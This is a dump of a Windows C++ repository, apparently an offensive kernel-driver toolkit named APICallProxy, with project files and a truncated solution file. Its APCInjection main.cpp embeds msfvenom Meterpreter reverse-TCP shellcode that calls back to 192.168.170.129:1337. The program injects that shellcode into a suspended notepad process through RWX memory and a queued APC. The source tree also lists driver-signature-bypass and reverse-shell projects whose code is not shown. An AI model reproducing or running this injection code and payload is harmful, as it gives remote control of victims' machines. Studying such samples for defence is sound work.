Project Path: arc_MahmoudZohdy_APICallProxy_aoigppxb

Source Tree:

```txt
arc_MahmoudZohdy_APICallProxy_aoigppxb
├── APICallProxy
│   ├── APCInjection
│   │   ├── APCInjection.vcxproj
│   │   ├── APCInjection.vcxproj.filters
│   │   └── main.cpp
│   ├── APICallProxy
│   │   ├── APICallProxy.inf
│   │   ├── APICallProxy.vcxproj
│   │   ├── APICallProxy.vcxproj.filters
│   │   ├── CommonStruct.h
│   │   ├── FileSystem.h
│   │   ├── General.h
│   │   ├── IOCTLCodes.h
│   │   ├── Network.h
│   │   ├── Process.h
│   │   ├── Prototypes.h
│   │   ├── Registry.h
│   │   ├── Struct.h
│   │   ├── Thread.h
│   │   ├── Utility.h
│   │   └── main.cpp
│   ├── APICallProxy.sln
│   ├── DisableDSE
│   │   ├── DisableDSE.vcxproj
│   │   ├── DisableDSE.vcxproj.filters
│   │   ├── hde64.h
│   │   └── main.cpp
│   ├── RegisterLoadDriver
│   │   ├── RegisterLoadDriver.vcxproj
│   │   ├── RegisterLoadDriver.vcxproj.filters
│   │   └── main.cpp
│   ├── ReverseShellClient
│   │   ├── ReverseShellClient.vcxproj
│   │   ├── ReverseShellClient.vcxproj.filters
│   │   └── main.cpp
│   ├── ReverseShellServer
│   │   ├── ReverseShellServer.vcxproj
│   │   ├── ReverseShellServer.vcxproj.filters
│   │   └── main.cpp
│   ├── WinsockClient
│   │   ├── WinsockClient.vcxproj
│   │   ├── WinsockClient.vcxproj.filters
│   │   └── main.cpp
│   └── WinsockServer
│       ├── WinsockServer.vcxproj
│       ├── WinsockServer.vcxproj.filters
│       └── main.cpp
├── LICENSE
└── README.md

```

`APICallProxy/APCInjection/APCInjection.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{c583ac97-6e6d-4be5-9539-3516d164fb60}</ProjectGuid>
    <RootNamespace>APCInjection</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v142</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`APICallProxy/APCInjection/APCInjection.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`APICallProxy/APCInjection/main.cpp`:

```cpp
// UserClient.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>

#include "../APICallProxy/IOCTLCodes.h"
#include "../APICallProxy/CommonStruct.h"

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID;
typedef CLIENT_ID* PCLIENT_ID;

typedef LONG KPRIORITY;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
#ifdef MIDL_PASS
	[size_is(MaximumLength / 2), length_is((Length) / 2)] USHORT* Buffer;
#else // MIDL_PASS
	_Field_size_bytes_part_opt_(MaximumLength, Length) PWCH   Buffer;
#endif // MIDL_PASS
} UNICODE_STRING;
typedef UNICODE_STRING* PUNICODE_STRING;
typedef const UNICODE_STRING* PCUNICODE_STRING;

typedef struct _VM_COUNTERS {
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
} VM_COUNTERS;
typedef VM_COUNTERS* PVM_COUNTERS;

typedef struct _SYSTEM_THREADS_ {
	LARGE_INTEGER  KernelTime;
	LARGE_INTEGER  UserTime;
	LARGE_INTEGER  CreateTime;
	ULONG          WaitTime;
	PVOID          StartAddress;
	CLIENT_ID      ClientId;
	KPRIORITY      Priority;
	KPRIORITY      BasePriority;
	ULONG          ContextSwitchCount;
	LONG           State;
	LONG           WaitReason;
} SYSTEM_THREADS, * PSYSTEM_THREADS;

typedef struct _SYSTEM_PROCESSES_ {
	ULONG            NextEntryDelta;
	ULONG            ThreadCount;
	ULONG            Reserved1[6];
	LARGE_INTEGER    CreateTime;
	LARGE_INTEGER    UserTime;
	LARGE_INTEGER    KernelTime;
	UNICODE_STRING   ProcessName;
	KPRIORITY        BasePriority;
	SIZE_T           ProcessId;
	SIZE_T           InheritedFromProcessId;
	ULONG            HandleCount;
	ULONG            Reserved2[2];
	VM_COUNTERS      VmCounters;

	ULONG PrivatePageCount;// add by achillis

	IO_COUNTERS      IoCounters;
	SYSTEM_THREADS   Threads[1];
} SYSTEM_PROCESSES_, * PSYSTEM_PROCESSES_;

#define SystemProcessInformation 5

typedef struct _SYSTEM_BASIC_INFORMATION_
{
	ULONG Reserved;
	ULONG TimerResolution;
	ULONG PageSize;
	ULONG NumberOfPhysicalPages;
	ULONG LowestPhysicalPageNumber;
	ULONG HighestPhysicalPageNumber;
	ULONG AllocationGranularity;
	ULONG_PTR MinimumUserModeAddress;
	ULONG_PTR MaximumUserModeAddress;
	ULONG_PTR ActiveProcessorsAffinityMask;
	CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION_, * PSYSTEM_BASIC_INFORMATION_;

#define SystemBasicInformation 0


//this shellcode works only on x64 bit OS
unsigned char scode[] =
// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.170.129 LPORT=1337 EXITFUNC=thread -f c
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a"
"\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff"
"\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01"
"\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58\x5e\x59\x48\x01\xd0\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff"
"\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49"
"\xbc\x02\x00\x05\x39\xc0\xa8\xaa\x81\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00"
"\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41"
"\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a"
"\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2"
"\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7d\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff"
"\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a\x41\x89\xda\xff\xd5\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90";


int main(int argc, WCHAR* argv[])
{
	BOOL Status = 1;
	DWORD returned;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE ProcessHandle = NULL;;
	HANDLE ThreadHandle = NULL;
	HANDLE FileHandle = NULL;
	AllocateVirtualMeomryInfo AlocateMemoryInfo{ 0 };
	ReadWriteVirtualMemoryInfo WriteMemoryInfo{ 0 };
	QueueUSerApcInfo APCinfo { 0 };
	CreateFileInfo FileInfo{ 0 };
	DWORD64 ShellCodeSize = 528;
	BYTE* ShellCode = scode;

	printf("This sample only works on win10 x64 Bit OS as x64 Bit Application\n");
	
	HANDLE hDevice = CreateFile(L"\\\\.\\APICallProxy", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("Failed To Open Driver Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	WCHAR procname[] = L"c:\\Windows\\notepad.exe";
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcess(NULL, (LPWSTR)procname, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("Failed to Create NotePad.exe Error Code 0x%x\n", GetLastError());
		return 0;
	}

	ProcessHandle = pi.hProcess;
	ThreadHandle = pi.hThread;
	

	AlocateMemoryInfo.BaseAddress = NULL;
	AlocateMemoryInfo.RegionSize = ShellCodeSize;
	AlocateMemoryInfo.ProcessHandle = ProcessHandle;
	AlocateMemoryInfo.Protect = PAGE_EXECUTE_READWRITE;
	AlocateMemoryInfo.AllocationType = MEM_RESERVE | MEM_COMMIT;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_ALLOCATE_MEMORY_IN_PROCESS_USING_HANDLE, &AlocateMemoryInfo, sizeof(AllocateVirtualMeomryInfo), NULL, NULL, &returned, nullptr);
	if (!Status) {
		printf("Error Allocating RWX Memory in Remote Process\n");
		return 0;
	}
	
	printf("+ Allocated RWX Memory in NotePad Process at %p\n", AlocateMemoryInfo.BaseAddress);

	WriteMemoryInfo.ProcessHandle = (HANDLE)ProcessHandle;
	WriteMemoryInfo.Data = (unsigned char*)ShellCode;
	WriteMemoryInfo.BaseAddress = AlocateMemoryInfo.BaseAddress;
	WriteMemoryInfo.DataLen = ShellCodeSize;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_WRITE_PROCESS_MEMORY, &WriteMemoryInfo, sizeof(ReadWriteVirtualMemoryInfo), nullptr, NULL, &returned, nullptr);
	if (!Status) {
		printf("+ Failed Write ShellCode to Remote Process Address Space\n");
		return 0;
	}

	printf("+ Finished Write ShellCode to Remote Process Address Space\n");

	Sleep(50);

	APCinfo.ThreadHandle = ThreadHandle;
	APCinfo.ProcAddres = (DWORD64)AlocateMemoryInfo.BaseAddress;
	APCinfo.ArgumentData = NULL;			// you can add any argument, but you need to write it to the address space of the injected process first
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_QUEUE_APC, &APCinfo, sizeof(QueueUSerApcInfo), nullptr, 0, &returned, nullptr);
	if (!Status) {
		printf("+ Failed Quing APC to Remote Process Main thread\n");
		return 0;
	}

	printf("+ Finished Quing APC to Remote Process Main thread\n");


	//Close Handle to Remote Process and its main Thread
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &ProcessHandle, sizeof(HANDLE), nullptr, 0, &returned, nullptr);
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &ThreadHandle, sizeof(HANDLE), nullptr, 0, &returned, nullptr);

	return 0;
}

```

`APICallProxy/APICallProxy.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.32413.511
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "APICallProxy", "APICallProxy\APICallProxy.vcxproj", "{007F48A4-2B27-410C-91AF-BCEE273877CA}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "APCInjection", "APCInjection\APCInjection.vcxproj", "{C583AC97-6E6D-4BE5-9539-3516D164FB60}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "DisableDSE", "DisableDSE\DisableDSE.vcxproj", "{E9415243-3A91-4DA8-A331-CA475DB3B845}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "RegisterLoadDriver", "RegisterLoadDriver\RegisterLoadDriver.vcxproj", "{1D21E6D1-5ECC-4DDD-BCB8-9B398D135DF5}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "WinsockClient", "WinsockClient\WinsockClient.vcxproj", "{448052C3-FBD9-4369-B0D5-9DDAAB260FA2}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "WinsockServer", "WinsockServer\WinsockServer.vcxproj", "{A3CD5A6F-848D-480D-B8AD-64410602476D}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ReverseShellServer", "ReverseShellServer\ReverseShellServer.vcxproj", "{562688E7-71B3-4D28-9568-8F231240F403}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ReverseShellClient", "ReverseShellClient\ReverseShellClient.vcxproj", "{8D49460F-1B25-40E0-89CB-6778B18C969C}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|ARM = Debug|ARM
		Debug|ARM64 = Debug|ARM64
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|ARM = Release|ARM
		Release|ARM64 = Release|ARM64
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Debug|ARM.ActiveCfg = Debug|ARM
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Debug|ARM.Build.0 = Debug|ARM
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Debug|ARM.Deploy.0 = Debug|ARM
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Debug|ARM64.ActiveCfg = Debug|ARM64
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Debug|ARM64.Build.0 = Debug|ARM64
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Debug|ARM64.Deploy.0 = Debug|ARM64
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Debug|x64.ActiveCfg = Debug|x64
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Debug|x64.Build.0 = Debug|x64
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Debug|x64.Deploy.0 = Debug|x64
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Debug|x86.ActiveCfg = Debug|Win32
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Debug|x86.Build.0 = Debug|Win32
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Debug|x86.Deploy.0 = Debug|Win32
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Release|ARM.ActiveCfg = Release|ARM
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Release|ARM.Build.0 = Release|ARM
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Release|ARM.Deploy.0 = Release|ARM
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Release|ARM64.ActiveCfg = Release|ARM64
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Release|ARM64.Build.0 = Release|ARM64
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Release|ARM64.Deploy.0 = Release|ARM64
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Release|x64.ActiveCfg = Release|x64
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Release|x64.Build.0 = Release|x64
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Release|x64.Deploy.0 = Release|x64
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Release|x86.ActiveCfg = Release|Win32
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Release|x86.Build.0 = Release|Win32
		{007F48A4-2B27-410C-91AF-BCEE273877CA}.Release|x86.Deploy.0 = Release|Win32
		{C583AC97-6E6D-4BE5-9539-3516D164FB60}.Debug|ARM.ActiveCfg = Debug|Win32
		{C583AC97-6E6D-4BE5-9539-3516D164FB60}.Debug|ARM64.ActiveCfg = Debug|Win32
		{C583AC97-6E6D-4BE5-9539-3516D164FB60}.Debug|x64.ActiveCfg = Debug|x64
		{C583AC97-6E6D-4BE5-9539-3516D164FB60}.Debug|x64.Build.0 = Debug|x64
		{C583AC97-6E6D-4BE5-9539-3516D164FB60}.Debug|x86.ActiveCfg = Debug|Win32
		{C583AC97-6E6D-4BE5-9539-3516D164FB60}.Debug|x86.Build.0 = Debug|Win32
		{C583AC97-6E6D-4BE5-9539-3516D164FB60}.Release|ARM.ActiveCfg = Release|Win32
		{C583AC97-6E6D-4BE5-9539-3516D164FB60}.Release|ARM64.ActiveCfg = Release|Win32
		{C583AC97-6E6D-4BE5-9539-3516D164FB60}.Release|x64.ActiveCfg = Release|x64
		{C583AC97-6E6D-4BE5-9539-3516D164FB60}.Release|x64.Build.0 = Release|x64
		{C583AC97-6E6D-4BE5-9539-3516D164FB60}.Release|x86.ActiveCfg = Release|Win32
		{C583AC97-6E6D-4BE5-9539-3516D164FB60}.Release|x86.Build.0 = Release|Win32
		{E9415243-3A91-4DA8-A331-CA475DB3B845}.Debug|ARM.ActiveCfg = Debug|Win32
		{E9415243-3A91-4DA8-A331-CA475DB3B845}.Debug|ARM64.ActiveCfg = Debug|Win32
		{E9415243-3A91-4DA8-A331-CA475DB3B845}.Debug|x64.ActiveCfg = Debug|x64
		{E9415243-3A91-4DA8-A331-CA475DB3B845}.Debug|x64.Build.0 = Debug|x64
		{E9415243-3A91-4DA8-A331-CA475DB3B845}.Debug|x86.ActiveCfg = Debug|Win32
		{E9415243-3A91-4DA8-A331-CA475DB3B845}.Debug|x86.Build.0 = Debug|Win32
		{E9415243-3A91-4DA8-A331-CA475DB3B845}.Release|ARM.ActiveCfg = Release|Win32
		{E9415243-3A91-4DA8-A331-CA475DB3B845}.Release|ARM64.ActiveCfg = Release|Win32
		{E9415243-3A91-4DA8-A331-CA475DB3B845}.Release|x64.ActiveCfg = Release|x64
		{E9415243-3A91-4DA8-A331-CA475DB3B845}.Release|x64.Build.0 = Release|x64
		{E9415243-3A91-4DA8-A331-CA475DB3B845}.Release|x86.ActiveCfg = Release|Win32
		{E9415243-3A91-4DA8-A331-CA475DB3B845}.Release|x86.Build.0 = Release|Win32
		{1D21E6D1-5ECC-4DDD-BCB8-9B398D135DF5}.Debug|ARM.ActiveCfg = Debug|Win32
		{1D21E6D1-5ECC-4DDD-BCB8-9B398D135DF5}.Debug|ARM64.ActiveCfg = Debug|Win32
		{1D21E6D1-5ECC-4DDD-BCB8-9B398D135DF5}.Debug|x64.ActiveCfg = Debug|x64
		{1D21E6D1-5ECC-4DDD-BCB8-9B398D135DF5}.Debug|x64.Build.0 = Debug|x64
		{1D21E6D1-5ECC-4DDD-BCB8-9B398D135DF5}.Debug|x86.ActiveCfg = Debug|Win32
		{1D21E6D1-5ECC-4DDD-BCB8-9B398D135DF5}.Debug|x86.Build.0 = Debug|Win32
		{1D21E6D1-5ECC-4DDD-BCB8-9B398D135DF5}.Release|ARM.ActiveCfg = Release|Win32
		{1D21E6D1-5ECC-4DDD-BCB8-9B398D135DF5}.Release|ARM64.ActiveCfg = Release|Win32
		{1D21E6D1-5ECC-4DDD-BCB8-9B398D135DF5}.Release|x64.ActiveCfg = Release|x64
		{1D21E6D1-5ECC-4DDD-BCB8-9B398D135DF5}.Release|x64.Build.0 = Release|x64
		{1D21E6D1-5ECC-4DDD-BCB8-9B398D135DF5}.Release|x86.ActiveCfg = Release|Win32
		{1D21E6D1-5ECC-4DDD-BCB8-9B398D135DF5}.Release|x86.Build.0 = Release|Win32
		{448052C3-FBD9-4369-B0D5-9DDAAB260FA2}.Debug|ARM.ActiveCfg = Debug|Win32
		{448052C3-FBD9-4369-B0D5-9DDAAB260FA2}.Debug|ARM64.ActiveCfg = Debug|Win32
		{448052C3-FBD9-4369-B0D5-9DDAAB260FA2}.Debug|x64.ActiveCfg = Debug|x64
		{448052C3-FBD9-4369-B0D5-9DDAAB260FA2}.Debug|x64.Build.0 = Debug|x64
		{448052C3-FBD9-4369-B0D5-9DDAAB260FA2}.Debug|x86.ActiveCfg = Debug|Win32
		{448052C3-FBD9-4369-B0D5-9DDAAB260FA2}.Debug|x86.Build.0 = Debug|Win32
		{448052C3-FBD9-4369-B0D5-9DDAAB260FA2}.Release|ARM.ActiveCfg = Release|Win32
